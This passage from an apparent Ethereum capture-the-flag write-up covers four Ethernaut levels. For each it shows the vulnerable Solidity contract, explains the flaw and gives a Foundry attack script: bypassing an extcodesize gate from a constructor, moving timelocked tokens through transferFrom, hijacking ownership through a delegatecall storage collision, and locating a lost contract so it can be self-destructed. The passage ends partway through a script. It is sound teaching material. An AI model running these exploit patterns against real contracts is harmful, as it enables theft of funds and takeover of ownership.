</span><span>$ forge script script/GatekeeperOneSolve.s.sol:GatekeeperOneSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=14-gatekeeper-two>14 Gatekeeper Two</h1><p><code>GatekeeperTwo.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract GatekeeperTwo {
</span><span>
</span><span>  address public entrant;
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateOne</span><span>() {
</span><span>    </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>!= </span><span>tx.origin);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateTwo</span><span>() {
</span><span>    uint x;
</span><span>    assembly { x :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>extcodesize</span><span>(</span><span style=color:#795da3;font-weight:700>caller</span><span>()) }
</span><span>    </span><span style=color:#62a35c>require</span><span>(x </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>gateThree</span><span>(bytes8 _gateKey) {
</span><span>    </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>uint64</span><span>(</span><span style=color:#795da3;font-weight:700>bytes8</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(msg.sender)))) </span><span style=color:#a71d5d;font-weight:700>^ </span><span style=color:#795da3;font-weight:700>uint64</span><span>(_gateKey) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>type</span><span>(uint64).max);
</span><span>    _;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>enter</span><span>(bytes8 _gateKey) </span><span style=color:#795da3;font-weight:700>public gateOne gateTwo gateThree</span><span>(_gateKey) </span><span style=color:#795da3;font-weight:700>returns </span><span>(bool) {
</span><span>    entrant </span><span style=color:#a71d5d;font-weight:700>= </span><span>tx.origin;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</ol><ul><li>Solution</ul><ol><li>Similiar to gatekeeper one, to pass <code>gateOne()</code> here wee need to call from a contract.<li><code>gateTwo()</code> checks that the caller contract code should zero. You think its impossible? Not at all.<li>Yes, code inside contract constructor won't be stored on blockchain. So, we can call the <code>enter()</code> from our attack contract constructor.<li>To pass the <code>gateThree()</code> we need to simple XOR operation. To get the <code>gateKey()</code> we need to do <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code> XOR <code>type(uint64).max</code></ol><p><code>GatekeeperTwoSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{GatekeeperTwo} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/GatekeeperTwo.sol"</span><span>;
</span><span>
</span><span>contract GatekeeperTwoSolve is Script{
</span><span>    GatekeeperTwo public gateTwo </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GatekeeperTwo</span><span>(</span><span style=color:#0086b3>0x9C11F689500821ffE630e6CFea7aC45C7226040c</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Entrant : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(gateTwo.</span><span style=color:#795da3;font-weight:700>entrant</span><span>()));
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack();
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Entrant : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(gateTwo.</span><span style=color:#795da3;font-weight:700>entrant</span><span>()));
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    
</span><span>    </span><span style=color:#969896;font-style:italic>// uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() {
</span><span>        GatekeeperTwo gateTwo </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GatekeeperTwo</span><span>(</span><span style=color:#0086b3>0x9C11F689500821ffE630e6CFea7aC45C7226040c</span><span>);
</span><span>        uint64 max </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>type</span><span>(uint64).max;
</span><span>        uint64 hsh </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>uint64</span><span>(</span><span style=color:#795da3;font-weight:700>bytes8</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)))));
</span><span>        bytes8 _gateKey </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>bytes8</span><span>(max </span><span style=color:#a71d5d;font-weight:700>^ </span><span>hsh);
</span><span>
</span><span>        </span><span style=color:#62a35c>require</span><span>(gateTwo.</span><span style=color:#795da3;font-weight:700>enter</span><span>(_gateKey));
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/GatekeeperTwoSolve.s.sol:GatekeeperTwoSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=15-naught-coin>15 Naught Coin</h1><p><code>NaughtCoin.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>'@openzeppelin-contracts/contracts/token/ERC20/ERC20.sol'</span><span>;
</span><span>
</span><span> contract NaughtCoin is </span><span style=color:#0086b3>ERC20 </span><span>{
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// string public constant name = 'NaughtCoin';
</span><span>  </span><span style=color:#969896;font-style:italic>// string public constant symbol = '0x0';
</span><span>  </span><span style=color:#969896;font-style:italic>// uint public constant decimals = 18;
</span><span>  uint public timeLock </span><span style=color:#a71d5d;font-weight:700>= </span><span>block.timestamp </span><span style=color:#a71d5d;font-weight:700>+ </span><span style=color:#0086b3>10 </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#0086b3>365 </span><span>days;
</span><span>  uint256 public </span><span style=color:#0086b3>INITIAL_SUPPLY</span><span>;
</span><span>  address public player;
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address _player) 
</span><span>  </span><span style=color:#795da3;font-weight:700>ERC20</span><span>(</span><span style=color:#183691>'NaughtCoin'</span><span>, </span><span style=color:#183691>'0x0'</span><span>) {
</span><span>    player </span><span style=color:#a71d5d;font-weight:700>= </span><span>_player;
</span><span>    </span><span style=color:#0086b3>INITIAL_SUPPLY </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>1000000 </span><span style=color:#a71d5d;font-weight:700>* </span><span>(</span><span style=color:#0086b3>10</span><span style=color:#a71d5d;font-weight:700>**</span><span style=color:#795da3;font-weight:700>uint256</span><span>(</span><span style=color:#795da3;font-weight:700>decimals</span><span>()));
</span><span>    </span><span style=color:#969896;font-style:italic>// _totalSupply = INITIAL_SUPPLY;
</span><span>    </span><span style=color:#969896;font-style:italic>// _balances[player] = INITIAL_SUPPLY;
</span><span>    </span><span style=color:#795da3;font-weight:700>_mint</span><span>(player, </span><span style=color:#0086b3>INITIAL_SUPPLY</span><span>);
</span><span>    emit </span><span style=color:#795da3;font-weight:700>Transfer</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>), player, </span><span style=color:#0086b3>INITIAL_SUPPLY</span><span>);
</span><span>  }
</span><span>  
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(address _to, uint256 _value) </span><span style=color:#795da3;font-weight:700>override public lockTokens returns</span><span>(bool) {
</span><span>    super.</span><span style=color:#795da3;font-weight:700>transfer</span><span>(_to, _value);
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// Prevent the initial owner from transferring tokens until the timelock has passed
</span><span>  modifier </span><span style=color:#795da3;font-weight:700>lockTokens</span><span>() {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>if </span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>player) {
</span><span>      </span><span style=color:#62a35c>require</span><span>(block.timestamp </span><span style=color:#a71d5d;font-weight:700>> </span><span>timeLock);
</span><span>      _;
</span><span>    } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>     _;
</span><span>    }
</span><span>  } 
</span><span>} 
</span><span>
</span></code></pre><ul><li>Goal</ul><ol><li>NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</ol><ul><li>Solution</ul><ol><li>NaughtCoin imports ERC20 contract. So, it consists of all the function of ERC20 contract also.<li>NaughtCoin only implemented the <code>lockTokens()</code> modifier on <code>transfer()</code> function only.<li>There are other ways to transfer tokens from one address to other without using <code>transfer()</code><li>Player can approve the allowances of their tokens to someone, and they can use <code>transferFrom()</code> function to transfer tokens on behalf of player.</ol><p><code>NaughtCoinSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{NaughtCoin} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/NaughtCoin.sol"</span><span>;
</span><span>
</span><span>contract NaughtCoinSolve is Script{
</span><span>    NaughtCoin public naughtCoin </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>NaughtCoin</span><span>(</span><span style=color:#0086b3>0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>
</span><span>        address player </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(naughtCoin.</span><span style=color:#795da3;font-weight:700>player</span><span>());
</span><span>        uint playerBalance </span><span style=color:#a71d5d;font-weight:700>= </span><span>naughtCoin.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(player);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player Balance : "</span><span>, playerBalance);
</span><span>        
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Address : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack));
</span><span>        
</span><span>        naughtCoin.</span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(attack), playerBalance);
</span><span>
</span><span>        attack.</span><span style=color:#795da3;font-weight:700>exploit</span><span>(player);
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player Balance : "</span><span>, naughtCoin.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(player));
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attacker Balance : "</span><span>, naughtCoin.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(attack)));
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    NaughtCoin public naughtCoin </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>NaughtCoin</span><span>(</span><span style=color:#0086b3>0xE4497348f2557Bb7Ecb4631426a0c2d880BE0497</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>(address _player) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        
</span><span>        </span><span style=color:#62a35c>require</span><span>(naughtCoin.</span><span style=color:#795da3;font-weight:700>allowance</span><span>(_player, </span><span style=color:#795da3;font-weight:700>address</span><span>(this)) </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#183691>"Not approved yet"</span><span>);
</span><span>
</span><span>        </span><span style=color:#62a35c>require</span><span>(naughtCoin.</span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(_player, </span><span style=color:#795da3;font-weight:700>address</span><span>(this), naughtCoin.</span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(_player)), </span><span style=color:#183691>"Transfer to Atacker Failed"</span><span>);
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/NaughtCoinSolve.s.sol:NaughtCoinSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=16-preservation>16 Preservation</h1><p><code>Preservation.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Preservation {
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// public library contracts 
</span><span>  address public timeZone1Library;
</span><span>  address public timeZone2Library;
</span><span>  address public owner; 
</span><span>  uint storedTime;
</span><span>  </span><span style=color:#969896;font-style:italic>// Sets the function signature for delegatecall
</span><span>  bytes4 constant setTimeSignature </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>bytes4</span><span>(</span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#183691>"setTime(uint256)"</span><span>));
</span><span>
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
</span><span>    timeZone1Library </span><span style=color:#a71d5d;font-weight:700>= </span><span>_timeZone1LibraryAddress; 
</span><span>    timeZone2Library </span><span style=color:#a71d5d;font-weight:700>= </span><span>_timeZone2LibraryAddress; 
</span><span>    owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>  }
</span><span> 
</span><span>  </span><span style=color:#969896;font-style:italic>// set the time for timezone 1
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setFirstTime</span><span>(uint _timeStamp) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    timeZone1Library.</span><span style=color:#795da3;font-weight:700>delegatecall</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(setTimeSignature, _timeStamp));
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// set the time for timezone 2
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setSecondTime</span><span>(uint _timeStamp) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    timeZone2Library.</span><span style=color:#795da3;font-weight:700>delegatecall</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(setTimeSignature, _timeStamp));
</span><span>  }
</span><span>}
</span><span>
</span><span style=color:#969896;font-style:italic>// Simple library contract to set the time
</span><span>contract LibraryContract {
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// stores a timestamp 
</span><span>  uint storedTime;  
</span><span>
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setTime</span><span>(uint _time) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    storedTime </span><span style=color:#a71d5d;font-weight:700>= </span><span>_time;
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>The goal of this level is for you to claim ownership of the instance you are given.</ol><ul><li>Solution</ul><ol><li>Preservation contract uses LibraryContract to set the time in the Preservation contract by using <code>delegatecall</code>.<li>As we know <code>delegatecall</code> runs the call in the context of the calle contract and updates the storage of the caller contract.<li>So, the caller and callee contract storage layout should be matched. If not it may result in storage collision bugs.<li>Here the Preservation contract doesn't matches the LibraryContract storage layout.<li>I observed that calling <code>setSecondTime</code> updates the <code>timeZone1Library</code> address in the Preservation contract.<li>By exploiting this we can write our own attacker contract that implements the <code>setTime()</code> function and pass that address to the <code>setSecondTime()</code> function so that it will updte the <code>timeZone1Library</code> address in the Preservation contract.<li>I implemented the Attack contract in such a way that it matches the Preservation storage layout and instead of updating the <code>stiredTime</code> i updated the <code>owner</code>. And that makes our attack contract as the owner of the Preservation contract.</ol><p><code>PreservationSolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Preservation} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/Preservation.sol"</span><span>;
</span><span>
</span><span>contract PreservationSolve is Script{
</span><span>    Preservation public preservation </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Preservation</span><span>(</span><span style=color:#0086b3>0x67403A5bC365868E3f9800c6308ca3623Bb1e446</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>(vm.</span><span style=color:#795da3;font-weight:700>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"timeZone1Library Address : "</span><span>, preservation.</span><span style=color:#795da3;font-weight:700>timeZone1Library</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"timeZone2Library Address : "</span><span>, preservation.</span><span style=color:#795da3;font-weight:700>timeZone2Library</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Owner : "</span><span>, preservation.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>        
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Attack();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Address : "</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(attack));
</span><span>        
</span><span>
</span><span>        attack.</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>
</span><span>
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"timeZone1Library Address : "</span><span>, preservation.</span><span style=color:#795da3;font-weight:700>timeZone1Library</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"timeZone2Library Address : "</span><span>, preservation.</span><span style=color:#795da3;font-weight:700>timeZone2Library</span><span>());
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Owner : "</span><span>, preservation.</span><span style=color:#795da3;font-weight:700>owner</span><span>());
</span><span>
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    </span><span style=color:#969896;font-style:italic>// matching Preservation Storage Layout
</span><span>    address public timeZone1Library;
</span><span>    address public timeZone2Library;
</span><span>    address public owner; 
</span><span>    uint storedTime;
</span><span>
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        Preservation preservation </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Preservation</span><span>(</span><span style=color:#0086b3>0x67403A5bC365868E3f9800c6308ca3623Bb1e446</span><span>);
</span><span>        uint attacker </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>uint</span><span>(</span><span style=color:#795da3;font-weight:700>uint160</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(this)));
</span><span>        preservation.</span><span style=color:#795da3;font-weight:700>setSecondTime</span><span>(attacker); </span><span style=color:#969896;font-style:italic>// updating timeZone1Library address;
</span><span>
</span><span>        preservation.</span><span style=color:#795da3;font-weight:700>setFirstTime</span><span>(</span><span style=color:#0086b3>1</span><span>);
</span><span>
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setTime</span><span>(uint _time) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// owner = address(uint160(_time));
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0x699BceEbD59a5b52bB586C737cD7ba636f3Fe602</span><span>);
</span><span>    }
</span><span>}
</span></code></pre><p>To run script :<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>$ source .env
</span><span>$ forge script script/PreservationSolve.s.sol:PreservationSolve --rpc-url $RPC_URL --broadcast
</span></code></pre><h1 id=17-recovery>17 Recovery</h1><p><code>Recovery.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Recovery {
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>//generate tokens
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>generateToken</span><span>(string memory _name, uint256 _initialSupply) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>new </span><span>SimpleToken(_name, msg.sender, _initialSupply);
</span><span>  
</span><span>  }
</span><span>}
</span><span>
</span><span>contract SimpleToken {
</span><span>
</span><span>  string public name;
</span><span>  </span><span style=color:#795da3;font-weight:700>mapping </span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) public balances;
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// constructor
</span><span>  </span><span style=color:#795da3;font-weight:700>constructor</span><span>(string memory _name, address _creator, uint256 _initialSupply) {
</span><span>    name </span><span style=color:#a71d5d;font-weight:700>= </span><span>_name;
</span><span>    balances[_creator] </span><span style=color:#a71d5d;font-weight:700>= </span><span>_initialSupply;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// collect ether in return for tokens
</span><span>  </span><span style=color:#795da3;font-weight:700>receive</span><span>() external payable {
</span><span>    balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.value </span><span style=color:#a71d5d;font-weight:700>* </span><span style=color:#0086b3>10</span><span>;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// allow transfers of tokens
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(address _to, uint _amount) </span><span style=color:#795da3;font-weight:700>public </span><span>{ 
</span><span>    </span><span style=color:#62a35c>require</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>= </span><span>_amount);
</span><span>    balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span>balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>- </span><span>_amount;
</span><span>    balances[_to] </span><span style=color:#a71d5d;font-weight:700>= </span><span>_amount;
</span><span>  }
</span><span>
</span><span>  </span><span style=color:#969896;font-style:italic>// clean up after ourselves
</span><span>  </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>destroy</span><span>(address payable _to) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>selfdestruct</span><span>(_to);
</span><span>  }
</span><span>}
</span></code></pre><ul><li>Goal</ul><ol><li>This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.</ol><ul><li>Solution</ul><ol><li>The SimpleToken contract is funded with 0.001 ether. We need to drain those ether.<li>To drain ether we can simply call the <code>destroy()</code> function of the SimpleToken contract.<li>But we dont have the address of the SimpleToken. We can user ETHERSCAN to identify the transaction of Recovery contract to find the address of the SimpleToken.<li>We can also use a formula that is mentioned in ethereum yellow paper about how a newly created contract address will be computed.<li>The formula is <code>address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(_creator), bytes1(0x01))))))</code><li><code>0xd6</code> and <code>0x94</code> are constants and the last byte1 is the nonce, i.e, number contracts created from the existed contract. We assume that its one.<li>By this formula we can recover the SimpleToken address and call the <code>destroy()</code> function to drain all ether.</ol><p><code>RecoverySolve.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
